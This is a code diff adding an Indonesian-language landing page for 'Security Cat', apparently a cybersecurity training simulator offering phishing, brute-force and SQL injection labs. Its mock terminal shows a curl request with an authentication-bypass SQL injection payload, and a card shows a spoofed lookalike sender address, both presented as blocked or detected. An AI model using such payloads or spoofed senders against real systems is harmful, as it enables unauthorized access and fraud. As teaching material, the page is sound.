@@ -1,11 +1,1122 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<body>
-    
-</body>
-</html>
+<!DOCTYPE html><html class="dark" lang="id" style=""><head><meta charset="utf-8"><meta content="width=device-width, initial-scale=1.0" name="viewport"><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&amp;family=JetBrains+Mono:wght@400;500;600&amp;display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"><style>@layer base{html,body{margin:0;padding:0;}body{overscroll-behavior:none;}main>:first-child{margin-top:0!important;}main>:last-child{margin-bottom:0!important;}}::-webkit-scrollbar{display:none;}</style><script src="https://cdn.tailwindcss.com"></script><script id="tailwind-config">tailwind.config = {
+    darkMode: "class",
+    theme: {
+      extend: {
+        "colors": {
+          "secondary": "#89ceff",
+          "secondary-container": "#00a2e6",
+          "tertiary": "#d8ffe7",
+          "inverse-primary": "#006970",
+          "on-primary": "#00363a",
+          "primary-container": "#00f0ff",
+          "on-secondary-fixed-variant": "#004c6e",
+          "surface-dim": "#0f131d",
+          "on-primary-container": "#006970",
+          "on-surface-variant": "#b9cacb",
+          "surface-container": "#1c1f2a",
+          "on-primary-fixed": "#002022",
+          "tertiary-fixed-dim": "#4edea3",
+          "on-secondary": "#00344d",
+          "primary-fixed-dim": "#00dbe9",
+          "surface-tint": "#00dbe9",
+          "on-tertiary-container": "#006d4a",
+          "surface-container-low": "#171b26",
+          "on-error-container": "#ffdad6",
+          "surface-container-high": "#262a35",
+          "error": "#ffb4ab",
+          "surface-variant": "#313540",
+          "on-primary-fixed-variant": "#004f54",
+          "inverse-on-surface": "#2c303b",
+          "on-tertiary-fixed": "#002113",
+          "primary-fixed": "#7df4ff",
+          "tertiary-fixed": "#6ffbbe",
+          "outline-variant": "#3b494b",
+          "primary": "#dbfcff",
+          "on-tertiary-fixed-variant": "#005236",
+          "background": "#0f131d",
+          "tertiary-container": "#65f2b5",
+          "secondary-fixed": "#c9e6ff",
+          "surface": "#0f131d",
+          "outline": "#849495",
+          "on-tertiary": "#003824",
+          "on-surface": "#dfe2f1",
+          "on-secondary-fixed": "#001e2f",
+          "surface-bright": "#353944",
+          "inverse-surface": "#dfe2f1",
+          "surface-container-lowest": "#0a0e18",
+          "secondary-fixed-dim": "#89ceff",
+          "on-secondary-container": "#00344e",
+          "error-container": "#93000a",
+          "surface-container-highest": "#313540",
+          "on-error": "#690005"
+        },
+        "borderRadius": {
+          "DEFAULT": "0.25rem",
+          "lg": "0.5rem",
+          "xl": "0.75rem",
+          "full": "9999px"
+        },
+        "spacing": {
+          "gutter-xl": "2rem",
+          "gutter-xs": "0.25rem",
+          "gutter-sm": "0.5rem",
+          "gutter-lg": "1.5rem",
+          "margin-tablet": "1.5rem",
+          "gutter-md": "1rem",
+          "margin-desktop": "2.5rem",
+          "terminal-indent": "1.25rem",
+          "margin-mobile": "1rem"
+        },
+        "fontFamily": {
+          "headline-md": [
+            "Inter"
+          ],
+          "headline-sm": [
+            "Inter"
+          ],
+          "display-hero": [
+            "Inter"
+          ],
+          "display-hero-mobile": [
+            "Inter"
+          ],
+          "headline-lg": [
+            "Inter"
+          ],
+          "body-sm": [
+            "Inter"
+          ],
+          "code-lg": [
+            "JetBrains Mono"
+          ],
+          "body-lg": [
+            "Inter"
+          ],
+          "headline-lg-mobile": [
+            "Inter"
+          ],
+          "code-md": [
+            "JetBrains Mono"
+          ],
+          "label-caps": [
+            "JetBrains Mono"
+          ],
+          "body-md": [
+            "Inter"
+          ],
+          "code-sm": [
+            "JetBrains Mono"
+          ]
+        },
+        "fontSize": {
+          "headline-md": [
+            "22px",
+            {
+              "lineHeight": "28px",
+              "letterSpacing": "-0.01em",
+              "fontWeight": "600"
+            }
+          ],
+          "headline-sm": [
+            "18px",
+            {
+              "lineHeight": "24px",
+              "letterSpacing": "0em",
+              "fontWeight": "600"
+            }
+          ],
+          "display-hero": [
+            "52px",
+            {
+              "lineHeight": "60px",
+              "letterSpacing": "-0.03em",
+              "fontWeight": "800"
+            }
+          ],
+          "display-hero-mobile": [
+            "34px",
+            {
+              "lineHeight": "42px",
+              "letterSpacing": "-0.02em",
+              "fontWeight": "800"
+            }
+          ],
+          "headline-lg": [
+            "32px",
+            {
+              "lineHeight": "40px",
+              "letterSpacing": "-0.02em",
+              "fontWeight": "700"
+            }
+          ],
+          "body-sm": [
+            "12px",
+            {
+              "lineHeight": "18px",
+              "fontWeight": "400"
+            }
+          ],
+          "code-lg": [
+            "15px",
+            {
+              "lineHeight": "24px",
+              "fontWeight": "500"
+            }
+          ],
+          "body-lg": [
+            "16px",
+            {
+              "lineHeight": "26px",
+              "fontWeight": "400"
+            }
+          ],
+          "headline-lg-mobile": [
+            "26px",
+            {
+              "lineHeight": "34px",
+              "letterSpacing": "-0.01em",
+              "fontWeight": "700"
+            }
+          ],
+          "code-md": [
+            "13px",
+            {
+              "lineHeight": "20px",
+              "fontWeight": "400"
+            }
+          ],
+          "label-caps": [
+            "11px",
+            {
+              "lineHeight": "16px",
+              "letterSpacing": "0.08em",
+              "fontWeight": "600"
+            }
+          ],
+          "body-md": [
+            "14px",
+            {
+              "lineHeight": "22px",
+              "fontWeight": "400"
+            }
+          ],
+          "code-sm": [
+            "11px",
+            {
+              "lineHeight": "16px",
+              "fontWeight": "400"
+            }
+          ]
+        }
+      }
+    }
+  }</script></head><body class="bg-background font-body-md text-on-surface antialiased selection:bg-primary-container selection:text-on-primary-container"><header class="fixed top-0 left-0 right-0 z-50 bg-surface-container-lowest/80 backdrop-blur-xl shadow-[0_1px_8px_rgba(0,0,0,0.3)]"><div class="w-full px-gutter-lg lg:px-margin-desktop h-20 flex items-center justify-between gap-gutter-md"><div class="flex items-center gap-gutter-xl"><a class="flex items-center gap-3 group" data-path="beranda" href="#"><img alt="Security Cat Logo" class="w-10 h-10 object-contain" src="https://lh3.googleusercontent.com/aida-public/AB6AXuDdl1xab_Hgcikv8rWS6lSIQh8fbUiLvjffo_Quoo02Re45e86crki7WPBgE1ieH5Uh7zw4nxwWGfO-gxXUqQpbTGS2bwFq5NSECGjzcmhMANYU2gn17DdzLNbNBdN5egQzgPGBludjucEwoxdOjQOV7iTYiUbKnAFDp1lWVhbQSKorV8BqD6tz1Tr90hRf4aTSg5U6wHz7p8Rbt_TTaeDq7ALNeu-5_pRn9jfZr8FaDOXqfIgNzfgJE1TuBnG6rBMJWA"><div class="flex flex-col"><span class="font-headline-sm text-headline-sm tracking-tight text-primary font-bold">Security Cat</span><span class="font-label-caps text-label-caps text-secondary uppercase">CyberAttack Edu</span></div></a><nav class="hidden items-center gap-1 md:flex" data-active-classes="bg-surface-container text-primary font-bold rounded-lg"><div class="relative group py-2"><button class="flex items-center gap-1.5 px-3.5 py-2 rounded-lg font-body-md text-body-md text-on-surface-variant hover:text-primary transition-colors" type="button"><span class="material-symbols-outlined text-[18px] text-primary">science</span><span class="font-medium">Lab &amp; Simulasi</span><span class="material-symbols-outlined text-[18px] transition-transform duration-200 group-hover:rotate-180">keyboard_arrow_down</span></button><div class="absolute left-0 top-full hidden group-hover:block w-64 p-2.5 rounded-xl bg-surface-container-high/95 backdrop-blur-xl shadow-2xl border border-primary/20 z-50"><div class="px-2 py-1 mb-1"><span class="font-label-caps text-[10px] text-secondary uppercase tracking-wider">Katalog Lab Praktik</span></div><a class="flex items-center gap-2.5 px-3 py-2 rounded-lg font-body-md text-body-sm text-on-surface-variant hover:bg-surface-variant hover:text-primary transition-colors" data-path="simulasi-phishing" href="#katalog-serangan"><span class="material-symbols-outlined text-[18px] text-error">mark_email_unread</span><span class="">Phishing &amp; Spoofing Lab</span></a><a class="flex items-center gap-2.5 px-3 py-2 rounded-lg font-body-md text-body-sm text-on-surface-variant hover:bg-surface-variant hover:text-secondary transition-colors" data-path="simulasi-brute-force" href="#katalog-serangan"><span class="material-symbols-outlined text-[18px] text-secondary">vpn_key_alert</span><span class="">Brute Force &amp; Rate Limit</span></a><a class="flex items-center gap-2.5 px-3 py-2 rounded-lg font-body-md text-body-sm text-on-surface-variant hover:bg-surface-variant hover:text-primary-container transition-colors" data-path="simulasi-sql-injection" href="#katalog-serangan"><span class="material-symbols-outlined text-[18px] text-primary-container">terminal</span><span class="">SQL Injection Playground</span></a><a class="flex items-center gap-2.5 px-3 py-2 rounded-lg font-body-md text-body-sm text-on-surface-variant hover:bg-surface-variant hover:text-tertiary-fixed transition-colors" data-path="simulasi-auth-flow" href="#katalog-serangan"><span class="material-symbols-outlined text-[18px] text-tertiary-fixed">key</span><span class="">Auth Flow &amp; Session</span></a><div class="my-1.5 border-t border-outline-variant/30"></div><a class="flex items-center gap-2.5 px-3 py-2 rounded-lg font-body-md text-body-sm text-on-surface-variant hover:bg-surface-variant hover:text-tertiary-container transition-colors" data-path="modul-mitigasi" href="#simulator-sandbox"><span class="material-symbols-outlined text-[18px] text-tertiary-container">shield</span><span class="">Modul Mitigasi &amp; Patching</span></a></div></div><a class="px-3.5 py-2 rounded-lg font-body-md text-body-md text-on-surface-variant hover:text-primary transition-colors flex items-center gap-1.5" data-path="metodologi" href="#"><span class="material-symbols-outlined text-[18px]">schema</span><span class="">Metodologi</span></a><a class="px-3.5 py-2 rounded-lg font-body-md text-body-md text-on-surface-variant hover:text-primary transition-colors flex items-center gap-1.5" data-path="leaderboard-ctf" href="#"><span class="material-symbols-outlined text-[18px]">leaderboard</span><span class="">Leaderboard CTF</span></a></nav></div><div class="flex items-center gap-gutter-md"><div class="hidden sm:flex items-center gap-3"><a class="inline-flex items-center justify-center px-4 py-2 rounded-lg font-code-md text-code-md text-primary bg-surface-container-high hover:bg-surface-variant hover:text-primary transition-all" data-path="terminal-login" href="#">Masuk Terminal</a><a class="inline-flex items-center justify-center px-5 py-2 rounded-lg font-code-md text-code-md font-bold bg-primary-container text-on-primary-container shadow-[0_0_20px_rgba(0,240,255,0.4)] hover:shadow-[0_0_28px_rgba(0,240,255,0.65)] hover:scale-[1.02] transition-all" data-path="simulasi-gratis" href="#">Mulai Simulasi Gratis</a></div><div class="relative" id="profile-dropdown-container"><button aria-expanded="false" aria-haspopup="true" class="w-9 h-9 rounded-full bg-primary flex items-center justify-center cursor-pointer hover:ring-2 hover:ring-primary-container hover:shadow-[0_0_12px_rgba(0,240,255,0.6)] transition-all outline-none relative" id="profile-toggle-btn" onclick="toggleProfileDropdown(event)" type="button"><span class="material-symbols-outlined text-on-primary text-[20px]">person</span><span class="absolute bottom-0 right-0 w-2.5 h-2.5 bg-tertiary-fixed border-2 border-surface-container-lowest rounded-full shadow-[0_0_6px_rgba(111,251,190,0.9)]"></span></button><div class="hidden absolute right-0 top-full mt-3 w-80 sm:w-96 rounded-2xl bg-surface-container-high/95 backdrop-blur-xl border border-primary/20 shadow-2xl z-50 overflow-hidden" id="profile-dropdown-menu"><div class="p-4 bg-surface-container-highest/60 border-b border-outline-variant/30"><div class="flex items-start justify-between gap-3"><div class="flex items-center gap-3"><div class="relative w-11 h-11 rounded-xl bg-primary flex items-center justify-center text-on-primary font-bold shadow-[0_0_15px_rgba(0,240,255,0.4)]"><span class="material-symbols-outlined text-[24px]">shield_person</span></div><div class="flex flex-col"><div class="flex items-center gap-1.5"><span class="font-headline-sm text-sm font-bold text-on-surface">Alex Sentinel</span><span class="material-symbols-outlined text-[15px] text-tertiary-fixed">verified</span></div><span class="font-code-sm text-[11px] text-on-surface-variant">@whitehat_alex</span></div></div><span class="px-2 py-0.5 rounded font-label-caps text-[10px] text-primary bg-primary/10 border border-primary/20 uppercase tracking-wide">Level 3</span></div><div class="mt-3.5 pt-3 border-t border-outline-variant/20 flex flex-col gap-1.5"><div class="flex items-center justify-between text-xs"><span class="font-headline-sm text-[11px] text-primary font-semibold flex items-center gap-1"><span class="material-symbols-outlined text-[14px]">shield_moon</span>Security Panther</span><span class="font-code-sm text-[11px] text-primary-fixed font-bold">2,450 / 3,500 XP</span></div><div class="w-full bg-surface-container-lowest h-2 rounded-full overflow-hidden p-0.5 border border-outline-variant/20"><div class="h-full rounded-full bg-gradient-to-r from-primary-container to-secondary shadow-[0_0_10px_rgba(0,240,255,0.7)]" style="width: 70%;"></div></div><span class="font-body-sm text-[10px] text-on-surface-variant">1,050 XP lagi untuk naik ke <strong class="text-tertiary-fixed font-semibold">Level 4 (Cyber Sentinel Cat)</strong></span></div></div><div class="p-4 border-b border-outline-variant/30 bg-surface-container-low/40"><div class="flex items-center justify-between mb-2.5"><div class="flex flex-col"><span class="font-label-caps text-xs text-secondary font-bold uppercase tracking-wider flex items-center gap-1"><span class="material-symbols-outlined text-[15px]">military_tech</span>Lencana Terkumpul (4/6)</span><span class="font-body-sm text-[10px] text-on-surface-variant">Didapatkan dari simulasi serangan siber</span></div><span class="font-code-sm text-[11px] text-tertiary-fixed font-bold bg-surface-container px-2 py-0.5 rounded">66% Complete</span></div><div class="grid grid-cols-3 gap-2 py-1"><div class="group relative flex flex-col items-center justify-center p-2 rounded-xl bg-surface-container border border-primary/25 hover:border-primary transition-all text-center"><span class="text-[20px] mb-0.5 group-hover:scale-110 transition-transform">🎣</span><span class="font-code-sm text-[10px] text-primary font-semibold truncate w-full">Phish Hunter</span><span class="font-label-caps text-[8px] text-tertiary-fixed uppercase mt-0.5">Unlocked</span></div><div class="group relative flex flex-col items-center justify-center p-2 rounded-xl bg-surface-container border border-secondary/25 hover:border-secondary transition-all text-center"><span class="text-[20px] mb-0.5 group-hover:scale-110 transition-transform">⚡</span><span class="font-code-sm text-[10px] text-secondary font-semibold truncate w-full">Rate Guardian</span><span class="font-label-caps text-[8px] text-tertiary-fixed uppercase mt-0.5">Unlocked</span></div><div class="group relative flex flex-col items-center justify-center p-2 rounded-xl bg-surface-container border border-primary-container/25 hover:border-primary-container transition-all text-center"><span class="text-[20px] mb-0.5 group-hover:scale-110 transition-transform">💉</span><span class="font-code-sm text-[10px] text-primary-container font-semibold truncate w-full">SQL Deflector</span><span class="font-label-caps text-[8px] text-tertiary-fixed uppercase mt-0.5">Unlocked</span></div><div class="group relative flex flex-col items-center justify-center p-2 rounded-xl bg-surface-container border border-tertiary-fixed/25 hover:border-tertiary-fixed transition-all text-center"><span class="text-[20px] mb-0.5 group-hover:scale-110 transition-transform">🔑</span><span class="font-code-sm text-[10px] text-tertiary-fixed font-semibold truncate w-full">Token Warden</span><span class="font-label-caps text-[8px] text-tertiary-fixed uppercase mt-0.5">Unlocked</span></div><div class="relative flex flex-col items-center justify-center p-2 rounded-xl bg-surface-container-lowest/70 border border-outline-variant/30 opacity-60 text-center"><span class="text-[18px] mb-0.5">🛡️</span><span class="font-code-sm text-[10px] text-on-surface-variant truncate w-full">Zero-Day</span><span class="font-label-caps text-[8px] text-outline uppercase mt-0.5 flex items-center justify-center gap-0.5"><span class="material-symbols-outlined text-[9px]">lock</span>Locked</span></div><div class="relative flex flex-col items-center justify-center p-2 rounded-xl bg-surface-container-lowest/70 border border-outline-variant/30 opacity-60 text-center"><span class="text-[18px] mb-0.5">🏆</span><span class="font-code-sm text-[10px] text-on-surface-variant truncate w-full">CTF Pioneer</span><span class="font-label-caps text-[8px] text-outline uppercase mt-0.5 flex items-center justify-center gap-0.5"><span class="material-symbols-outlined text-[9px]">lock</span>Locked</span></div></div><div class="mt-3 pt-2"><a class="w-full inline-flex items-center justify-between px-3 py-2 rounded-lg bg-surface-container hover:bg-surface-variant text-primary hover:text-primary-fixed font-code-sm text-xs transition-colors border border-outline-variant/20" href="#"><span class="flex items-center gap-2"><span class="material-symbols-outlined text-[16px]">workspace_premium</span>Kelola Lencana &amp; Showcase</span><span class="material-symbols-outlined text-[16px]">arrow_forward</span></a></div></div><div class="p-2 flex flex-col gap-0.5"><a class="flex items-center gap-2.5 px-3 py-2 rounded-lg font-body-md text-sm text-on-surface-variant hover:bg-surface-variant hover:text-primary transition-colors" href="#"><span class="material-symbols-outlined text-[18px] text-secondary">account_circle</span>Profil Pengguna</a><a class="flex items-center gap-2.5 px-3 py-2 rounded-lg font-body-md text-sm text-on-surface-variant hover:bg-surface-variant hover:text-primary transition-colors" href="#"><span class="material-symbols-outlined text-[18px] text-on-surface-variant">settings</span>Pengaturan Akun</a><div class="my-1 border-t border-outline-variant/30"></div><a class="flex items-center gap-2.5 px-3 py-2 rounded-lg font-body-md text-sm text-error hover:bg-error-container/20 transition-colors" href="#"><span class="material-symbols-outlined text-[18px] text-error">logout</span>Keluar</a></div></div></div></div></div></header><main class="w-full pt-20 bg-background"><div class="flex flex-col w-full">
+<!-- Top Atmospheric Gradient & Grid Accent -->
+<div class="relative w-full overflow-hidden bg-surface-container-lowest">
+<div class="absolute inset-0 bg-[radial-gradient(ellipse_80%_60%_at_50%_-20%,rgba(0,240,255,0.12),transparent_75%)] pointer-events-none"></div>
+<div class="absolute inset-0 bg-[linear-gradient(to_right,rgba(255,255,255,0.02)_1px,transparent_1px),linear-gradient(to_bottom,rgba(255,255,255,0.02)_1px,transparent_1px)] bg-[size:4rem_4rem] [mask-image:radial-gradient(ellipse_60%_50%_at_50%_0%,#000_70%,transparent_100%)] pointer-events-none"></div>
+<!-- Hero Content Container -->
+<div class="relative w-full max-w-7xl mx-auto px-gutter-lg lg:px-margin-desktop pt-8 pb-16 lg:pt-14 lg:pb-24">
+<!-- Badge Group -->
+<div class="flex flex-wrap items-center gap-3 mb-6">
+<div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-surface-container-high shadow-sm backdrop-blur-md">
+<span class="inline-block w-2 h-2 rounded-full bg-primary-container shadow-[0_0_8px_rgba(0,240,255,0.9)] animate-pulse"></span>
+<span class="font-label-caps text-label-caps text-primary uppercase">CyberAttack Simulator v3.4</span>
+</div>
+<div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-surface-container-high shadow-sm backdrop-blur-md">
+<span class="material-symbols-outlined text-[15px] text-tertiary-fixed">verified_user</span>
+<span class="font-label-caps text-label-caps text-tertiary-fixed uppercase">100% Praktik Interaktif - Ethical Defense</span>
+</div>
+</div>
+<!-- Hero Grid Layout -->
+<div class="grid grid-cols-1 lg:grid-cols-12 gap-10 lg:gap-8 items-center">
+<!-- Hero Left Column: Typography & CTAs -->
+<div class="lg:col-span-7 flex flex-col gap-6">
+<div class="flex flex-col gap-3">
+<span class="font-label-caps text-label-caps text-secondary tracking-widest uppercase">// DEFENSE THROUGH OFFENSIVE KNOWLEDGE</span>
+<h1 class="font-display-hero text-display-hero text-on-surface tracking-tight leading-[1.08]">
+              Kuasai Pertahanan Siber Lewat <span class="text-transparent bg-clip-text bg-gradient-to-r from-primary-container via-secondary to-tertiary-fixed">Simulasi Serangan Nyata</span>
+</h1>
+</div>
+<p class="font-body-lg text-body-lg text-on-surface-variant max-w-xl leading-relaxed">
+            Pelajari anatomi eksploitasi siber dari sudut pandang penyerang untuk membangun sistem yang tak tertembus. Dirancang khusus untuk mahasiswa teknik, pengembang aplikasi, dan analis SOC dalam lingkungan sandbox bebas risiko.
+          </p>
+<!-- Dual CTA Buttons -->
+<div class="flex flex-wrap items-center gap-4 pt-2">
+<a class="inline-flex items-center justify-center gap-2.5 px-6 py-3.5 rounded-lg font-code-md text-code-md font-bold bg-primary-container text-on-primary-container shadow-[0_0_24px_rgba(0,240,255,0.45)] hover:shadow-[0_0_35px_rgba(0,240,255,0.7)] hover:scale-[1.02] transition-all" href="#simulator-sandbox">
+<span class="material-symbols-outlined text-[20px]">terminal</span>
+<span class="">Buka Lab Simulasi Gratis</span>
+</a>
+<a class="inline-flex items-center justify-center gap-2.5 px-6 py-3.5 rounded-lg font-code-md text-code-md font-semibold text-primary bg-surface-container-high hover:bg-surface-variant shadow-sm hover:text-primary-container transition-all" href="#katalog-serangan">
+<span class="material-symbols-outlined text-[20px]">security</span>
+<span class="">Eksplorasi 4 Vektor Serangan</span>
+</a>
+</div>
+<!-- Quick Metrics Bar -->
+<div class="grid grid-cols-2 sm:grid-cols-4 gap-4 pt-6 mt-4">
+<div class="flex flex-col p-3 rounded-lg bg-surface-container-low shadow-sm">
+<span class="font-headline-sm text-headline-sm text-primary font-bold">50,000+</span>
+<span class="font-body-sm text-body-sm text-on-surface-variant">Simulasi Berjalan</span>
+</div>
+<div class="flex flex-col p-3 rounded-lg bg-surface-container-low shadow-sm">
+<span class="font-headline-sm text-headline-sm text-tertiary-fixed font-bold">4 Lab Inti</span>
+<span class="font-body-sm text-body-sm text-on-surface-variant">Vektor Eksploitasi</span>
+</div>
+<div class="flex flex-col p-3 rounded-lg bg-surface-container-low shadow-sm">
+<span class="font-headline-sm text-headline-sm text-secondary font-bold">99.4%</span>
+<span class="font-body-sm text-body-sm text-on-surface-variant">Akurasi Deteksi</span>
+</div>
+<div class="flex flex-col p-3 rounded-lg bg-surface-container-low shadow-sm">
+<span class="font-headline-sm text-headline-sm text-primary font-bold">Zero-Risk</span>
+<span class="font-body-sm text-body-sm text-on-surface-variant">Isolated Web Sandbox</span>
+</div>
+</div>
+</div>
+<!-- Hero Right Column: Interactive Live Sandbox Window Terminal -->
+<div class="lg:col-span-5 flex flex-col">
+<div class="relative w-full rounded-xl bg-surface-container-high shadow-2xl overflow-hidden">
+<!-- Window Titlebar -->
+<div class="flex items-center justify-between px-4 py-3 bg-surface-container-highest">
+<div class="flex items-center gap-2">
+<div class="w-3 h-3 rounded-full bg-error"></div>
+<div class="w-3 h-3 rounded-full bg-secondary-fixed"></div>
+<div class="w-3 h-3 rounded-full bg-tertiary-fixed"></div>
+<span class="ml-2 font-code-sm text-code-sm text-on-surface-variant">sec-cat@sandbox-node-09: ~/attacks</span>
+</div>
+<div class="flex items-center gap-1.5 px-2 py-0.5 rounded bg-surface-container-low">
+<span class="inline-block w-1.5 h-1.5 rounded-full bg-tertiary-fixed animate-ping"></span>
+<span class="font-label-caps text-[10px] text-tertiary-fixed uppercase">LIVE PROBE</span>
+</div>
+</div>
+<!-- Terminal Tabs -->
+<div class="flex items-center overflow-x-auto bg-surface-container px-2 pt-2 gap-1" id="hero-tabs">
+<button class="hero-tab-btn flex items-center gap-1.5 px-3 py-1.5 rounded-t font-code-sm text-code-sm font-semibold bg-surface-container-high text-primary" id="tab-btn-sqli" onclick="switchHeroTab('sqli')" type="button">
+<span class="material-symbols-outlined text-[14px]">database</span>
+<span class="">SQLi Inject</span>
+</button>
+<button class="hero-tab-btn flex items-center gap-1.5 px-3 py-1.5 rounded-t font-code-sm text-code-sm text-on-surface-variant hover:text-on-surface bg-transparent" id="tab-btn-phish" onclick="switchHeroTab('phish')" type="button">
+<span class="material-symbols-outlined text-[14px]">mail</span>
+<span class="">Phish Spoof</span>
+</button>
+<button class="hero-tab-btn flex items-center gap-1.5 px-3 py-1.5 rounded-t font-code-sm text-code-sm text-on-surface-variant hover:text-on-surface bg-transparent" id="tab-btn-brute" onclick="switchHeroTab('brute')" type="button">
+<span class="material-symbols-outlined text-[14px]">password</span>
+<span class="">Brute Force</span>
+</button>
+</div>
+<!-- Terminal Screen Body -->
+<div class="p-5 font-code-sm text-code-sm bg-surface-container-lowest min-h-[290px] flex flex-col justify-between">
+<div class="space-y-2" id="hero-tab-content">
+<div class="text-on-surface-variant flex items-center justify-between">
+<span class="">[TARGET]: https://target-corp.internal/api/v1/auth</span>
+<span class="text-secondary">[METHOD: POST]</span>
+</div>
+<div class="text-primary-fixed">
+<span class="text-secondary">$</span> curl -X POST https://target.api/login -d "user=admin' OR '1'='1"
+                </div>
+<div class="text-error bg-surface-container-high p-2.5 rounded font-code-xs">
+<span class="font-bold text-error">[ALERT - ANOMALY TRIPPED]:</span> SELECT * FROM users WHERE user = 'admin' OR '1'='1' -- PASS BYPASS TRIGGERED
+                </div>
+<div class="text-on-surface-variant">
+<span class="text-tertiary-fixed">🛡️ Security Cat WAF:</span> Intercepting signature [OWASP-CRS-942100]...
+                </div>
+<div class="text-tertiary-container flex items-center gap-1.5">
+<span class="material-symbols-outlined text-[16px]">check_circle</span>
+<span class="">Mitigated: Parameterized statement enforced. HTTP 403 Forbidden emitted.</span>
+</div>
+</div>
+<!-- Terminal Security Cat AI Live Status Indicator -->
+<div class="pt-4 mt-4 bg-surface-container-low p-3 rounded-lg flex items-center gap-3">
+<div class="w-8 h-8 rounded-full bg-secondary-container/20 flex items-center justify-center shrink-0">
+<span class="material-symbols-outlined text-primary text-[18px]">pets</span>
+</div>
+<div class="flex flex-col min-w-0">
+<span class="font-label-caps text-label-caps text-secondary uppercase">Security Cat AI Companion</span>
+<span class="font-body-sm text-body-sm text-on-surface truncate" id="cat-ai-status">Analisis paket SQL Injection aktif: 0 payload lolos ke backend.</span>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<!-- SECTION 2: 4 Vektor Serangan Utama (Interactive Attack Cards) -->
+<section class="w-full bg-surface py-20" id="katalog-serangan">
+<div class="w-full max-w-7xl mx-auto px-gutter-lg lg:px-margin-desktop">
+<div class="flex flex-col md:flex-row md:items-end justify-between gap-4 mb-12">
+<div class="flex flex-col gap-2 max-w-2xl">
+<div class="flex items-center gap-2">
+<span class="material-symbols-outlined text-primary text-[18px]">hub</span>
+<span class="font-label-caps text-label-caps text-primary uppercase">Katalog Lab Eksploitasi Interaktif</span>
+</div>
+<h2 class="font-headline-lg text-headline-lg text-on-surface">4 Vektor Serangan Kritis Web Modern</h2>
+<p class="font-body-md text-body-md text-on-surface-variant">
+            Uji coba simulasi live di setiap arena. Pahami bagaimana penyerang mengeksploitasi celah dan cara menerapkan kode remediasi yang absolut.
+          </p>
+</div>
+<div class="flex items-center gap-2 text-on-surface-variant font-code-sm text-code-sm">
+<span class="inline-block w-2 h-2 rounded-full bg-tertiary-fixed"></span>
+<span class="">4 Modul Terverifikasi OWASP Top 10</span>
+</div>
+</div>
+<!-- Attack Grid -->
+<div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+<!-- CARD A: Phishing Lab Simulator -->
+<div class="group flex flex-col justify-between p-6 rounded-2xl bg-surface-container hover:bg-surface-container-high transition-all shadow-md">
+<div class="flex flex-col gap-4">
+<div class="flex items-start justify-between gap-4">
+<div class="w-12 h-12 rounded-xl bg-surface-container-highest flex items-center justify-center text-primary group-hover:bg-primary-container group-hover:text-on-primary-container transition-colors">
+<span class="material-symbols-outlined text-[26px]">mark_email_unread</span>
+</div>
+<span class="px-2.5 py-1 rounded font-label-caps text-label-caps text-error bg-surface-container-highest">Vektor #01: Social Eng</span>
+</div>
+<div class="flex flex-col gap-1.5">
+<h3 class="font-headline-sm text-headline-sm text-on-surface">Phishing &amp; Header Spoofing Lab</h3>
+<p class="font-body-md text-body-md text-on-surface-variant">
+                Bedah taktik spear phishing, deteksi domain lookalike (typosquatting), verifikasi kegagalan record SPF, DKIM, dan DMARC pada raw MIME header.
+              </p>
+</div>
+<!-- Mini Interactive Inspector Mock -->
+<div class="p-3.5 rounded-lg bg-surface-container-lowest font-code-sm text-code-sm flex flex-col gap-2">
+<div class="flex items-center justify-between text-on-surface-variant">
+<span class="text-secondary font-semibold">Tampilan Header Palsu vs Asli:</span>
+<span class="text-error">[DKIM FAIL]</span>
+</div>
+<div class="bg-surface-container p-2 rounded text-error text-[11px] truncate">
+                From: "Security Alert" &lt;support@paypa1-update.com.id&gt;
+              </div>
+<div class="bg-surface-container p-2 rounded text-tertiary-fixed text-[11px] truncate">
+                Resolusi SPF: HardFail (IP 194.26.29.112 not permitted sender)
+              </div>
+</div>
+</div>
+<div class="pt-6 mt-6 flex items-center justify-between">
+<span class="font-body-sm text-body-sm text-on-surface-variant">Tingkat: Pemula - Menengah</span>
+<button class="inline-flex items-center gap-1.5 font-code-md text-code-md text-primary hover:text-primary-fixed transition-colors" type="button">
+<span class="">Mulai Lab Phishing</span>
+<span class="material-symbols-outlined text-[18px]">arrow_forward</span>
+</button>
+</div>
+</div>
+<!-- CARD B: Brute Force & Rate Limit Breaker -->
+<div class="group flex flex-col justify-between p-6 rounded-2xl bg-surface-container hover:bg-surface-container-high transition-all shadow-md">
+<div class="flex flex-col gap-4">
+<div class="flex items-start justify-between gap-4">
+<div class="w-12 h-12 rounded-xl bg-surface-container-highest flex items-center justify-center text-secondary group-hover:bg-secondary-container group-hover:text-on-secondary-container transition-colors">
+<span class="material-symbols-outlined text-[26px]">vpn_key_alert</span>
+</div>
+<span class="px-2.5 py-1 rounded font-label-caps text-label-caps text-secondary bg-surface-container-highest">Vektor #02: Credential Stuffing</span>
+</div>
+<div class="flex flex-col gap-1.5">
+<h3 class="font-headline-sm text-headline-sm text-on-surface">Brute Force &amp; Rate Limiting Arena</h3>
+<p class="font-body-md text-body-md text-on-surface-variant">
+                Simulasikan serangan kamus otomatis berkecepatan 12,000 req/min. Pelajari bagaimana implementasi Token Bucket, IP Throttling, dan adaptive CAPTCHA mematahkan botnet.
+              </p>
+</div>
+<!-- Mini Interactive Visualizer Mock -->
+<div class="p-3.5 rounded-lg bg-surface-container-lowest font-code-sm text-code-sm flex flex-col gap-2">
+<div class="flex items-center justify-between text-on-surface-variant">
+<span class="text-secondary font-semibold">Bot Stream Rate:</span>
+<span class="text-error font-bold">12,480 req/s</span>
+</div>
+<!-- Progress Bar Representation -->
+<div class="w-full bg-surface-container h-2 rounded-full overflow-hidden">
+<div class="bg-error h-full rounded-full" style="width: 86%;"></div>
+</div>
+<div class="flex justify-between text-[11px] text-tertiary-fixed">
+<span class="">Mitigasi: Leaky Bucket (Rate: 5 req/min)</span>
